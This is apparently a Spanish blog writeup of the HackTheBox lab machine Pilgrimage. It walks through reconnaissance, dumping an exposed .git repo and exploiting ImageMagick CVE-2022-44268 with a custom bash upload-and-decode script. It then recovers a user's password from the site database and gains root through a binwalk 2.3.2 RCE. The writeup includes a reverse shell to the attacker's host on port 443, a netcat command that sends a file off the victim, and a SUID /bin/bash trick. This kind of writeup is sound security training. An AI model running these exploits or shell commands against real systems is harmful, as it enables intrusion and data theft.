---
title: "Pilgrimage"
date: 2025-05-29 16:41:43 +0200
categories: writeups HackTheBox
tags: imagemagick lfi bash scripting infoleak rce cve máquina binwalk linux
description: Writeup de la máquina Pilgrimage de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Reconocimiento

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103141348.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.219`.
### Nmap

En segundo lugar, realizaremos un escaneo usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n -oG allPorts 10.10.11.219
```

Observamos como nos reporta que se encuentran abiertos los puertos **22 y 80**.

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103141520.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 -sCV 10.10.11.219 -oN targeted
```

Lo más interesante que podemos encontrar en la captura de **Nmap** es que nos está chivando que vamos a tener que usar **Virtual Hosting**.

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103141543.png>)
___
## Explotación

Como tenemos pocas opciones intentaremos acceder a la página web pero veremos que nos redirige a **pilgrimage.htb**.

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103141649.png>)

Para solucionar este problema debemos actualizar nuestro `/etc/hosts` con la siguiente línea:

```c
10.10.11.219  pilgrimage.htb
```

Veremos que ahora si que podemos acceder correctamente a la página web alojada en el puerto **80**.

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103141939.png>)

En primer lugar, probaremos el funcionamiento de la página el cual se basa en hacer **más pequeña** una **imagen** proporcionada por el usuario, y además tenemos la capacidad de **registrarnos** y por consiguiente de **logearnos**.

Ante este tipo de escenario lo primero que se nos ocurre es subir un **cmd.php** para tener una consola web pero veremos que al subir un imagen con extensión **.jpg** nos cambia la extensión a **.jpeg** por lo que no vamos a poder subir un fichero **.php** malicioso.

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103142316.png>)

En este punto comenzaremos a realizar **fuzzing** de directorios usando **Gobuster** de la siguiente forma ya que no hemos conseguido encontrar ninguna forma de subir un **cmd.php**.

```bash
gobuster dir -u http://pilgrimage.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js
```

Observamos que entre todos los directorios que nos encuentra el que más nos llama la atención es el **/.git** ya que en este seguramente se encuentre todo el código fuente de la página web.

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103142454.png>)

Nos aprovecharemos de la herramienta **git-dumper** (`pip3 install git-dumper`) para descargarnos todo el contenido del repositorio, en definitiva ejecutaremos el siguiente comando:

```bash
git-dumper http://pilgrimage.htb/ git
```

Observaremos que hemos conseguido descargarnos el contenido alojado **/.git**:

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103143053.png>)

En este punto lo que debemos de hacer es ponernos a leer el código fuente para así entender que está pasando por detrás, además de buscar algún **Information Leakage**.

<span style="color:green">En esta porción de código entenderemos que porque cuando subíamos una imagen con <strong>.jpg</strong> nos cambiaba la extensión a <strong>.jpeg</strong></span>.
<span style="color:red">En esta sección de código vemos que esta usando el binario <strong>magick</strong> ( el cual esta presente en el repositorio recientemente descargado) para cambiar el tamaño a la imagen que el usuario proporciona.</span>
<span style="color:cyan">Finalmente, en el último porción de código veremos como está realizando una consulta a un archivo de base de datos llamado <strong>/var/db/pilgrimage</strong> en el que guardara el link, el usuario y el nombre original en el caso de que el usuario este logeado.</span>

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103143330.png>)

Debemos de tener en cuenta que los binarios encargados de transformar imágenes suelen ser vulnerables a un **Arbitrary File Read** por lo que en ese caso mostraremos la versión del binario **magick** presente en el repositorio de github descargado (**/.git**)  y vemos que está usando **ImageMagick 7.1.0-49**.

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103162737.png>)

Buscando en internet por exploits relacionados con esta versión nos encontraremos con el siguiente **repositorio](https://github.com/entr0pie/CVE-2022-44268) el cual contiene un exploit el cual nos permite leer archivos internos del sistema (**Arbitrary File Read**), es decir algo similar a un [LFI**.

Nos clonaremos el repositorio con la siguiente instrucción:

```bash
git clone https://github.com/entr0pie/CVE-2022-44268
```

Su forma de uso es muy sencilla tan solo hemos de introducir la ruta del sistema que queremos leer, en este caso `/etc/passwd` y veremos como nos crea una imagen (**output.png**) la cual contiene un código malicioso que nos permitirá leer archivos internos de la máquina víctima.

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103163758.png>)

Ahora lo que debemos de hacer es subir la imagen **output.png** para que sea tratada por el binario **magick** y así poder leer el `/etc/passwd` de la máquina víctima. 

En este punto tenemos dos vías para **leer ficheros internos del sistema**. O bien podemos subir la imagen a través de la **navegador**, descargárnosla y mirar su contenido (`identify -verbose downloaded_image.png`) o bien podemos crearnos un **script** en **bash** el cual nos automatice todo este proceso, en definitiva dicho script quedaría tal que así:

```bash
#!/bin/bash

if [ $# -eq 1 ]; then
  filename="$1"
else
  echo -en "\n[!] Debes de introducir la ruta el archivo del sistema a leer\n"
  exit 1
fi

function run_python_exploit(){
  # Nos metemos dentro del directorio donde se encuentra el script para evitar errores
  cd CVE-2022-44268/

  # Ejecutamos el exploit el cual introduce el archivo a leer dentro de la imagen
  python3 CVE-2022-44268.py $1 2>/dev/null
}

function upload_download_image(){
  # Retrocedemos un directorio para situarnos donde estabamos
  cd ..
  filename=$1

  # Subiremos la imagen usando curl y además guardaremos en una variable el link donde se ha subido.
  url_image=$(curl -s -X POST -F "toConvert=@/home/terror/Desktop/Machines/Pilgrimage/exploits/CVE-2022-44268/output.png" -L --max-redirs 0 http://pilgrimage.htb/index.php -i | grep -oP "message=\K[^&]*" 2>/dev/null)

  # Guardaremos el nombre de la imagen para posteriormente analizar si podemos leer el fichero especificado con: identify -verbose $image_name
  image_name=$(echo -n "$url_image" | grep -oP "shrunk/\K.*\.png" 2>/dev/null)

  echo -ne "[+] Imagen subida correctamente: $image_name.\n\n"

  # Descargaremos la imagen en el directorio actual de trabajo para posteriormetne mirar si hemos conseguido leer algún fichero
  wget $url_image &>/dev/null

  # Guardaremos la longitud para en caso de que no haya encontrado el fichero mostrar un mensaje de por pantalla
  len_output=$(identify -verbose $image_name | grep -Ev "(^ |Image)" | tr -d '\n' | xxd -r -p | wc -c)
  
  if ! [ $len_output -eq 0 ]; then
    echo -ne "[+] Mostrando el contenido del fichero $filename:\n\n"

    # Una vez nos hayamos asegurado de que existe el fichero mostraremos por pantalla su contenido gracias de una expresión regular y tras haberlo decodificarlo
    identify -verbose $image_name | grep -Ev "(^ |Image)" | tr -d '\n' | xxd -r -p
  else 
      echo -ne "[!] El fichero $filename no existe en el sistema de la máquina víctima.\n"
  fi

  echo $hola

  # Borramos todas las imagenes que nos hayamos descargado para dejarlo todo más limpio
  for archivo in *.png; do [ -f "$archivo" ] && rm "$archivo"; done
}

run_python_exploit $1
upload_download_image $1
```

Usando el script creado en **bash** veremos que es mucho más cómodo tal y como vemos a continuación: 

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103174954.png>)

En este punto lo primero que se nos ocurre es mirar la **id_rsa** de la usuaria **emily** ya que es la única que tiene una **/bin/bash** junto con el root pero veremos que no somos capaces de leer dicho fichero:

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103175602.png>)

También se nos ocurre mirar el contenido del archivo `/proc/net/tcp` en el cual podemos ver los puertos que están abiertos gracias al siguiente oneliner de bash:

```bash
for port in $(./upload_image.sh /proc/net/tcp | tail -n +6 | head -n -1 | awk -F ':' '{print $3}' | awk '{print $1}'); do echo $((0x$port)); done
```

Veremos que están abiertos los puertos **80 y 22** tan y como nuestro escaneo de **Nmap** nos ha reportado:

> Destacar que aparece un puerto **80** adicional debido a que también nos muestra las conexiones **establecidas**.

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103180904.png>)

Si volvemos a mirar en el **código fuente** (**/.git**) veremos que hay un archivo de base de datos en `/var/lib/pilgrimage` tal y como habíamos mencionado anteriormente por lo que intentaremos leer el contenido de dicho fichero.

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103181220.png>)
 
Observamos que conseguimos leer el fichero pero al ser un **binario** no podemos leerlo adecuadamente tal y como vemos a continuación:

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103181325.png>)

Exportaremos dicho contenido a un fichero para posteriormente ejecutarlo con **sqlite3**, es decir debemos de ejecutar el siguiente comando:

```bash
./upload_image.sh /var/db/pilgrimage | tail -n +5 > pilgrimage.db
```

Como bien hemos mencionado antes abriremos el fichero **pilgrimage.db** con **sqlite3** y veremos que en la tabla **users** conseguimos leer la contraseña correspondiente a la usuaria **emily**.

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103181904.png>)

Intentaremos conectarnos a través de **ssh** con las credenciales encontradas (**emily:abigchonkyboi123**) y veremos que conseguimos acceder correctamente a la máquina vícitima:

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103182143.png>)
___
## Escalada de privilegios

Como nos hemos conectado por **ssh** no hace falta hacer un **Tratamiento de la TTY**, lo único que debemos de hacer es un `export TERM=xterm` para que nos funcione el <kbd>CTRL</kbd>+<kbd>L</kbd>.

Miraremos por las formas típicas de elevar nuestros privilegios (**Sudoers**, **SUID**) pero no encontraremos nada.

En este punto se me ocurre mirar miraremos los **puertos** que se encuentran abiertos con `netstat -tnl` y nos daremos cuenta que la conclusión que hemos sacado antes es correcta que ya se encuentran abiertos el **80** y **22*.

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103183130.png>)

Tras un rato buscando otras formas potenciales de elevar mis privilegios decido **Transferirme** **pspy** a la máquina víctima y al ejecutarlo observo que se está ejecutando un binario un tanto extraño de nombre **malwarescan.sh**:

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103184605.png>)

Para ver mejor el contenido del fichero me pondré en escucha por **NetCat** (`nc -nvlp 443 | catn -l sh`) y desde la máquina víctima me contactaré con **NetCat** (`nc 10.10.14.10 443 < /usr/sbin/malwarescan.sh`):

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103184950.png>)

Obviamente dicho script no tenemos capacidad para modificarlo por lo que nos tocará indagar sobre los **binarios** de los cuales desconocemos su uso, es decir: `/usr/bin/inotifywait` y `/usr/local/bin/binwalk`.
### /usr/bin/inotifywait

En primer lugar, comenzaremos a investigar sobre el uso del binario `/usr/bin/inotifywait`, para ello debemos de tener dos sesiones de **ssh** cada una en una terminal diferente, y tal y como vemos a continuación cuando se crea un fichero en un directorio indicado (`/dev/shm`) el binario `/usr/bin/inotify/wait` nos lo reportará.

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103191201.png>)
### /usr/local/bin/binwalk

En segundo lugar comenzaremos a analizar de lo que se encarga de hacer el binario `/usr/local/bin/binwalk` y tras buscar en internet nos encontraremos con la siguiente definición: _Es una herramienta para buscar archivos incrustados y código ejecutable en una imagen binaria._ 
### /usr/sbin/malwarescan.sh

Tras entender como funcionan estos dos **binarios** procederemos a **transferiremos** el script (**/usr/sbin/malwarescan.sh**) a nuestra máquina atacante para así poder escribir sobre él **comentarios** que nos hagan entender mejor su funcionamiento, en definitiva quedaría tal que así:

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable") # Palabras clave para saber si la imagen contiene código incrustado 

# Crea un bucle que itera por todos los fichero que sean creado en /var/www/pilgrimage.htb/shrunk/ y los almacena en FILE
/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
    filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')" # Guarda en una variable el nombre del fichero
    
    binout="$(/usr/local/bin/binwalk -e "$filename")" # Gracias a binwalk sabremos si la imagen que se crea en /var/www/pilgrimage.htb/shrunk/ contiene algún código incrustado 
	    
	    # Gracias al siguiente bucle eliminaremos todos las images que contengan las palabras clave de la variable blacklist, es decir que supuestamente tengan código incrustado.
        for banned in "${blacklist[@]}"; do
        if [[ "$binout" == *"$banned"* ]]; then
            /usr/bin/rm "$filename"
            break
        fi
    done
done
```
### binwalk 2.3.2

A simple vista no veremos ninguna forma potencial de abusar sobre este script pero tras buscar y buscar nos daremos cuenta que la versión de **binwalk** es la **2.3.2**, tal y como vemos a continuación:

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103193709.png>)

Si buscamos en **searchsploit** por algún exploit relacionado con dicha versión (**2.3.2**) para **binwalk** veremos que existe una **RCE**:

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103193921.png>)

Nos descargaremos el exploit (`searchsploit -m python/remote/51249.py`) y al ejecutarlo veremos que hemos de pasarle como argumentos la imagen donde va a incrustar código, nuestra **Dirección IP** y el puerto por el cual nos pondremos en escucha con **NetCat** (`nc -nvlp 443`):

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103200332.png>)

Ejecutaremos el exploit y automáticamente nos generará una imagen maliciosa la cual contendrá código incrustado el cual se encargará de enviarnos una **Reverse Shell** al puerto **443**, en definitiva debemos de ejecutar lo siguiente:

```bash
python3 binwalk_exploit.py source.png 10.10.14.10 443
```

En este punto lo que haremos será **transferirnos** dicha imagen a la máquina víctima y la ubicaremos en `/var/www/pilgrimage.htb/shrunk` ya que sobre este directorio está actuando el script `/usr/sbin/malwarescan.sh` el cual a su vez se encarga de ejecutar `/usr/local/bin/binwalk` el cual es vulnerable a un **RCE** debido a su desactualizada versión (**2.3.2**).

En el momento que ubiquemos la imagen sobre dicho directorio (`/var/www/pilgrimage.htb/shrunk`) obtendremos una **Reverse Shell** de manera inmediata.

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103200921.png>)

Otra opción adicional sería cambiar el código de script y elegir nosotros el comando que queremos ejecutar, en este caso sería un `chmod +s /bin/bash`.

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103201716.png>)

Realizaremos el mismo procedimiento de antes y veremos que al ubicar el fichero en `/var/www/pilgrimage.htb/shrunk` la **/bin/bash** obtendrá permisos **SUID**, tal y como podemos ver en la siguiente captura de pantalla:

![](<../assets/images/posts/2025-05-29-pilgrimage/Pasted image 20250103201916.png>)

> Destacar que la forma en la que elevaremos nuestros privilegios dependerá de nuestra imaginación ya que de igual forma podíamos haber copiado nuestra **id_rsa.pub** en el **authorized_keys** del **root**.